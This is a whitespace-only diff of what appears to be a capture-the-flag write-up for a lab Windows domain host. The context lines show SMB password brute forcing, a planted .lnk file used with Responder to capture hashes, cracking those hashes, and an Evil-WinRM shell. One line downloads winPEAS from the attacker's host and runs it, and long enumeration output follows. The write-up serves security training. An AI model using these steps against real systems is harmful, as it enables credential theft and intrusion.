@@ -8,7 +8,6 @@ Once again you find yourself on the internal network of the Windcorp Corporation
 
 ![](https://tryhackme-images.s3.amazonaws.com/room-icons/b24d17051176c781124f199e22213b1f.jpeg)
 
-
  Start Machine
 
 Story
@@ -179,7 +178,6 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 101.20 seconds
 
-
 ┌──(kali㉿kali)-[~]
 └─$ sudo nano /etc/hosts                                           
 [sudo] password for kali: 
@@ -196,7 +194,6 @@ Nmap done: 1 IP address (1 host up) scanned in 101.20 seconds
 10.10.167.117 team.thm
 10.10.167.117 dev.team.thm
 10.10.242.97 set.windcorp.thm
-
 
 https://set.windcorp.thm/
 
@@ -231,8 +228,6 @@ there are names and emails
 <name>Addison Russell</name>
 <phone>9425499327</phone>
 
-
-
 ┌──(kali㉿kali)-[~]
 └─$ gobuster dir -u https://set.windcorp.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -k -x txt,php,py,html 
 ===============================================================
@@ -260,7 +255,6 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 /Assets               (Status: 301) [Size: 155] [--> https://set.windcorp.thm/Assets/]
 /INDEX.html           (Status: 200) [Size: 42259]
 /appnotes.txt         (Status: 200) [Size: 146]
-
 
 https://set.windcorp.thm/appnotes.txt
 
@@ -401,7 +395,6 @@ zacksul
 ┌──(kali㉿kali)-[~/Set]
 └─$ awk -F'[<>]' '/email/ {sub("@windcorp.thm", "", $3); print $3}' users.xml > users_final.txt
 
-
 using chatgpt :)
 
 Este comando dividirá cada línea en campos cada vez que encuentre el carácter "<" o ">", y luego reemplazará la subcadena "@windcorp.thm" por una cadena vacía en el tercer campo (que es la dirección de correo electrónico). Por último, imprimirá el tercer campo (la dirección de correo electrónico sin el dominio) de las líneas que contengan la cadena "email".
@@ -435,7 +428,6 @@ alpine
 └─$ pwd              
 /usr/share/seclists/Passwords/Common-Credentials
 
-
 Now using msf
 
 ┌──(kali㉿kali)-[~/Set]
@@ -448,7 +440,6 @@ Matching Modules
    #  Name                             Disclosure Date  Rank    Check  Description
    -  ----                             ---------------  ----    -----  -----------
    0  auxiliary/scanner/smb/smb_login                   normal  No     SMB Login Check Scanner
-
 
 Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_login
 
@@ -488,7 +479,6 @@ Module options (auxiliary/scanner/smb/smb_login):
    USER_AS_PASS       false            no        Try the username as the password for all users
    USER_FILE                           no        File containing usernames, one per line
    VERBOSE            true             yes       Whether to print output for all attempts
-
 
 View the full module info with the info, or info -d command.
 
@@ -2168,7 +2158,6 @@ msf6 auxiliary(scanner/smb/smb_login) > run
 ^C[*] 10.10.242.97:445      - Caught interrupt from the console...
 [*] Auxiliary module execution completed
 
-
 after 25 min
 
 myrtleowe:Passw@rd
@@ -2271,7 +2260,6 @@ rm: remove write-protected regular empty file 'mslink_v1.2/witty.lnk'? yes
 ┌──(kali㉿kali)-[~/Set]
 └─$ rm -r mslink_v1.2.tar.gz 
 
-
 ┌──(kali㉿kali)-[~/Set]
 └─$ ls -lah 
 total 36K
@@ -2285,7 +2273,6 @@ drwxr-xr-x 106 kali kali 4.0K Jan  2 12:18 ..
 ┌──(kali㉿kali)-[~/Set]
 └─$ zip hook.zip hook.lnk 
   adding: hook.lnk (deflated 42%)
-
 
 ┌──(kali㉿kali)-[~/Set]
 └─$ smbclient \\\\10.10.242.97\\Files -U myrtleowe
@@ -2318,7 +2305,6 @@ smb: \> ls
 
   Author: Laurent Gaffie (laurent.gaffie@gmail.com)
   To kill this script hit CTRL-C
-
 
 [+] Poisoners:
     LLMNR                      [ON]
@@ -2414,7 +2400,6 @@ Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corpo
 [*] Closing down connection (10.10.242.97,50318)
 [*] Remaining connections []
 
-
 now using john
 
 ┌──(kali㉿kali)-[~/Set]
@@ -2446,14 +2431,11 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\MichelleWat\Documents> cd ..\Desktop
 *Evil-WinRM* PS C:\Users\MichelleWat\Desktop> ls
 
-
     Directory: C:\Users\MichelleWat\Desktop
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -a----        6/16/2020   2:07 PM             52 Flag2.txt
-
 
 *Evil-WinRM* PS C:\Users\MichelleWat\Desktop> type Flag2.txt
 Flag2: THM{690798b1780964f5f51cebd854da5a2ea236ebb5}
@@ -2517,15 +2499,12 @@ Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
 *Evil-WinRM* PS C:\Users\MichelleWat\Desktop> Invoke-WebRequest http://10.8.19.103:1337/winPEASany_ofs.exe -o winPEASany_ofs.exe
 *Evil-WinRM* PS C:\Users\MichelleWat\Desktop> ls
 
-
     Directory: C:\Users\MichelleWat\Desktop
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -a----        6/16/2020   2:07 PM             52 Flag2.txt
 -a----         1/2/2023   9:46 AM        1829376 winPEASany_ofs.exe
-
 
 *Evil-WinRM* PS C:\Users\MichelleWat\Desktop> .\winPEASany_ofs.exe
 ANSI color bit for Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run 'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1' and then start a new CMD
@@ -2598,7 +2577,6 @@ Error while getting Win32_UserAccount info: System.Management.ManagementExceptio
   [X] Exception: Object reference not set to an instance of an object.
    - Creating AppLocker bypass list...
    - Creating files/directories list for search...
-
 
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ System Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
 
@@ -2831,8 +2809,6 @@ You are NOT inside a container
    AppLockerPolicy version: 1
    listing rules:
 
-
-
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Printers (WMI)
 
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Named Pipes
@@ -2842,13 +2818,11 @@ You are NOT inside a container
 
   ROUTER                                                                                               Everyone [WriteData/CreateFiles]                                       O:SYG:SYD:P(A;;0x12019b;;;WD)(A;;0x12019b;;;AN)(A;;FA;;;SY)
 
-
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating AMSI registered providers
     Provider:       {2781761E-28E0-4109-99FE-B9D127C57AFE}
     Path:           "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2006.10-0\MpOav.dll"
 
    =================================================================================================
-
 
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Enumerating Sysmon configuration
       You must be an administrator to run this check
@@ -2858,7 +2832,6 @@ You are NOT inside a container
 
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Installed .NET versions
                                                                                                               
-
 
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Interesting Events information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
 
@@ -2887,7 +2860,6 @@ System.UnauthorizedAccessException: Attempted to perform an unauthorized operati
    at winPEAS.Helpers.MyUtils.GetEventLogReader(String path, String query, String computerName)
    at hk.a.b()
    at in.a()
-
 
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Users Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
 
@@ -4419,7 +4391,6 @@ System.UnauthorizedAccessException: Attempted to perform an unauthorized operati
 
    =================================================================================================
 
-
 ÉÍÍÍÍÍÍÍÍÍÍ¹ RDP Sessions
     SessID    pSessionName   pUserName      pDomainName              State     SourceIP
     1         Console        MichelleWat    SET                      Active
@@ -4463,9 +4434,7 @@ System.UnauthorizedAccessException: Attempted to perform an unauthorized operati
     PasswordProperties: DOMAIN_PASSWORD_COMPLEX
    =================================================================================================
 
-
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Print Logon Sessions
-
 
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Processes Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
 
@@ -4477,8 +4446,6 @@ System.UnauthorizedAccessException: Attempted to perform an unauthorized operati
     File Path: \Windows\System32
     File Owner: NT SERVICE\TrustedInstaller
    =================================================================================================
-
-
 
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Services Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
   [X] Exception: Cannot open Service Control Manager on computer '.'. This operation might require other privileges.                                                                                                        
@@ -4612,7 +4579,6 @@ System.UnauthorizedAccessException: Attempted to perform an unauthorized operati
     @oem7.inf,%XenVifName%;AWS PV Network Class(Amazon Inc. - @oem7.inf,%XenVifName%;AWS PV Network Class)[C:\windows\System32\drivers\xenvif.sys] - System                                                                 
    =================================================================================================
 
-
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Modifiable Services
 È Check if you can modify any service https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services                                                                                             
     You cannot modify any service
@@ -4629,7 +4595,6 @@ System.UnauthorizedAccessException: Attempted to perform an unauthorized operati
     C:\windows\System32\WindowsPowerShell\v1.0\
     C:\windows\System32\OpenSSH\
     C:\Program Files\Microsoft\Web Platform Installer\
-
 
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ Applications Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
 
@@ -4658,7 +4623,6 @@ System.UnauthorizedAccessException: Attempted to perform an unauthorized operati
     C:\Program Files\WindowsApps
     C:\Program Files\WindowsPowerShell
 
-
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Autorun Applications
 È Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries                                                                  
 Error getting autoruns from WMIC: System.Management.ManagementException: Access denied
@@ -4674,18 +4638,15 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: C:\windows\system32\SecurityHealthSystray.exe
    =================================================================================================
 
-
     RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
     Key: Common Startup
     Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
    =================================================================================================
 
-
     RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
     Key: Common Startup
     Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
    =================================================================================================
-
 
     RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
     Key: Userinit
@@ -4693,13 +4654,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: C:\Windows\system32\userinit.exe,
    =================================================================================================
 
-
     RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
     Key: Shell
     Folder: None (PATH Injection)
     File: explorer.exe
    =================================================================================================
-
 
     RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
     Key: AlternateShell
@@ -4707,13 +4666,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: cmd.exe
    =================================================================================================
 
-
     RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
     Key: Adobe Type Manager
     Folder: None (PATH Injection)
     File: atmfd.dll
    =================================================================================================
-
 
     RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
     Key: Adobe Type Manager
@@ -4721,20 +4678,17 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: atmfd.dll
    =================================================================================================
 
-
     RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: midimapper
     Folder: None (PATH Injection)
     File: midimap.dll
    =================================================================================================
 
-
     RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: msacm.imaadpcm
     Folder: None (PATH Injection)
     File: imaadp32.acm
    =================================================================================================
-
 
     RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: msacm.l3acm
@@ -4742,13 +4696,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: C:\Windows\System32\l3codeca.acm
    =================================================================================================
 
-
     RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: msacm.msadpcm
     Folder: None (PATH Injection)
     File: msadp32.acm
    =================================================================================================
-
 
     RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: msacm.msg711
@@ -4756,13 +4708,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: msg711.acm
    =================================================================================================
 
-
     RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: msacm.msgsm610
     Folder: None (PATH Injection)
     File: msgsm32.acm
    =================================================================================================
-
 
     RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: vidc.i420
@@ -4770,13 +4720,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: iyuv_32.dll
    =================================================================================================
 
-
     RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: vidc.iyuv
     Folder: None (PATH Injection)
     File: iyuv_32.dll
    =================================================================================================
-
 
     RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: vidc.mrle
@@ -4784,13 +4732,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: msrle32.dll
    =================================================================================================
 
-
     RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: vidc.msvc
     Folder: None (PATH Injection)
     File: msvidc32.dll
    =================================================================================================
-
 
     RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: vidc.uyvy
@@ -4798,13 +4744,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: msyuv.dll
    =================================================================================================
 
-
     RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: vidc.yuy2
     Folder: None (PATH Injection)
     File: msyuv.dll
    =================================================================================================
-
 
     RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: vidc.yvu9
@@ -4812,20 +4756,17 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: tsbyuv.dll
    =================================================================================================
 
-
     RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: vidc.yvyu
     Folder: None (PATH Injection)
     File: msyuv.dll
    =================================================================================================
 
-
     RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: wavemapper
     Folder: None (PATH Injection)
     File: msacm32.drv
    =================================================================================================
-
 
     RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: midimapper
@@ -4833,13 +4774,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: midimap.dll
    =================================================================================================
 
-
     RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: msacm.imaadpcm
     Folder: None (PATH Injection)
     File: imaadp32.acm
    =================================================================================================
-
 
     RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: msacm.l3acm
@@ -4847,13 +4786,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: C:\Windows\SysWOW64\l3codeca.acm
    =================================================================================================
 
-
     RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: msacm.msadpcm
     Folder: None (PATH Injection)
     File: msadp32.acm
    =================================================================================================
-
 
     RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: msacm.msg711
@@ -4861,13 +4798,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: msg711.acm
    =================================================================================================
 
-
     RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: msacm.msgsm610
     Folder: None (PATH Injection)
     File: msgsm32.acm
    =================================================================================================
-
 
     RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: vidc.cvid
@@ -4875,13 +4810,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: iccvid.dll
    =================================================================================================
 
-
     RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: vidc.i420
     Folder: None (PATH Injection)
     File: iyuv_32.dll
    =================================================================================================
-
 
     RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: vidc.iyuv
@@ -4889,13 +4822,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: iyuv_32.dll
    =================================================================================================
 
-
     RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: vidc.mrle
     Folder: None (PATH Injection)
     File: msrle32.dll
    =================================================================================================
-
 
     RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: vidc.msvc
@@ -4903,13 +4834,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: msvidc32.dll
    =================================================================================================
 
-
     RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: vidc.uyvy
     Folder: None (PATH Injection)
     File: msyuv.dll
    =================================================================================================
-
 
     RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: vidc.yuy2
@@ -4917,13 +4846,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: msyuv.dll
    =================================================================================================
 
-
     RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: vidc.yvu9
     Folder: None (PATH Injection)
     File: tsbyuv.dll
    =================================================================================================
-
 
     RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: vidc.yvyu
@@ -4931,19 +4858,16 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: msyuv.dll
    =================================================================================================
 
-
     RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
     Key: wavemapper
     Folder: None (PATH Injection)
     File: msacm32.drv
    =================================================================================================
 
-
     RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
     Folder: C:\Program Files\Internet Explorer
     File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected)
    =================================================================================================
-
 
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: _wow64cpu
@@ -4951,13 +4875,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: wow64cpu.dll
    =================================================================================================
 
-
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: _wowarmhw
     Folder: None (PATH Injection)
     File: wowarmhw.dll
    =================================================================================================
-
 
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: _xtajit
@@ -4965,13 +4887,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: xtajit.dll
    =================================================================================================
 
-
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: advapi32
     Folder: None (PATH Injection)
     File: advapi32.dll
    =================================================================================================
-
 
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: clbcatq
@@ -4979,13 +4899,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: clbcatq.dll
    =================================================================================================
 
-
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: combase
     Folder: None (PATH Injection)
     File: combase.dll
    =================================================================================================
-
 
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: COMDLG32
@@ -4993,13 +4911,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: COMDLG32.dll
    =================================================================================================
 
-
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: coml2
     Folder: None (PATH Injection)
     File: coml2.dll
    =================================================================================================
-
 
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: DifxApi
@@ -5007,13 +4923,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: difxapi.dll
    =================================================================================================
 
-
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: gdi32
     Folder: None (PATH Injection)
     File: gdi32.dll
    =================================================================================================
-
 
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: gdiplus
@@ -5021,13 +4935,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: gdiplus.dll
    =================================================================================================
 
-
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: IMAGEHLP
     Folder: None (PATH Injection)
     File: IMAGEHLP.dll
    =================================================================================================
-
 
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: IMM32
@@ -5035,13 +4947,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: IMM32.dll
    =================================================================================================
 
-
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: kernel32
     Folder: None (PATH Injection)
     File: kernel32.dll
    =================================================================================================
-
 
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: MSCTF
@@ -5049,13 +4959,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: MSCTF.dll
    =================================================================================================
 
-
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: MSVCRT
     Folder: None (PATH Injection)
     File: MSVCRT.dll
    =================================================================================================
-
 
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: NORMALIZ
@@ -5063,13 +4971,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: NORMALIZ.dll
    =================================================================================================
 
-
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: NSI
     Folder: None (PATH Injection)
     File: NSI.dll
    =================================================================================================
-
 
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: ole32
@@ -5077,13 +4983,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: ole32.dll
    =================================================================================================
 
-
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: OLEAUT32
     Folder: None (PATH Injection)
     File: OLEAUT32.dll
    =================================================================================================
-
 
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: PSAPI
@@ -5091,13 +4995,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: PSAPI.DLL
    =================================================================================================
 
-
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: rpcrt4
     Folder: None (PATH Injection)
     File: rpcrt4.dll
    =================================================================================================
-
 
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: sechost
@@ -5105,13 +5007,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: sechost.dll
    =================================================================================================
 
-
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: Setupapi
     Folder: None (PATH Injection)
     File: Setupapi.dll
    =================================================================================================
-
 
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: SHCORE
@@ -5119,13 +5019,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: SHCORE.dll
    =================================================================================================
 
-
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: SHELL32
     Folder: None (PATH Injection)
     File: SHELL32.dll
    =================================================================================================
-
 
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: SHLWAPI
@@ -5133,13 +5031,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: SHLWAPI.dll
    =================================================================================================
 
-
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: user32
     Folder: None (PATH Injection)
     File: user32.dll
    =================================================================================================
-
 
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: WLDAP32
@@ -5147,13 +5043,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: WLDAP32.dll
    =================================================================================================
 
-
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: wow64
     Folder: None (PATH Injection)
     File: wow64.dll
    =================================================================================================
-
 
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: wow64win
@@ -5161,13 +5055,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: wow64win.dll
    =================================================================================================
 
-
     RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
     Key: WS2_32
     Folder: None (PATH Injection)
     File: WS2_32.dll
    =================================================================================================
-
 
     RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
     Key: StubPath
@@ -5176,13 +5068,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: /UserInstall
    =================================================================================================
 
-
     RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
     Key: StubPath
     Folder: C:\windows\system32
     File: C:\windows\system32\unregmp2.exe /FirstLogon
    =================================================================================================
-
 
     RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
     Key: StubPath
@@ -5190,13 +5080,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: U
    =================================================================================================
 
-
     RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
     Key: StubPath
     Folder: C:\Windows\System32
     File: C:\Windows\System32\ie4uinit.exe -UserConfig
    =================================================================================================
-
 
     RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
     Key: StubPath
@@ -5204,13 +5092,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
    =================================================================================================
 
-
     RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{9459C573-B17A-45AE-9F64-1857B5D58CEE}
     Key: StubPath
     Folder: C:\Program Files (x86)\Microsoft\Edge\Application\84.0.522.48\Installer
     File: C:\Program Files (x86)\Microsoft\Edge\Application\84.0.522.48\Installer\setup.exe --configure-user-settings --verbose-logging --system-level (Unquoted and Space detected)
    =================================================================================================
-
 
     RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}
     Key: StubPath
@@ -5218,13 +5104,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenAdmin
    =================================================================================================
 
-
     RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}
     Key: StubPath
     Folder: C:\Windows\System32
     File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenUser
    =================================================================================================
-
 
     RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}                                                                                                   
     Key: StubPath
@@ -5232,13 +5116,11 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
     File: C:\windows\system32\unregmp2.exe /FirstLogon
    =================================================================================================
 
-
     RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}                                                                                                   
     Key: StubPath
     Folder: C:\Windows\SysWOW64
     File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
    =================================================================================================
-
 
     RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}                                                                                                   
     Key: StubPath
@@ -5246,18 +5128,15 @@ Error getting autoruns from WMIC: System.Management.ManagementException: Access 
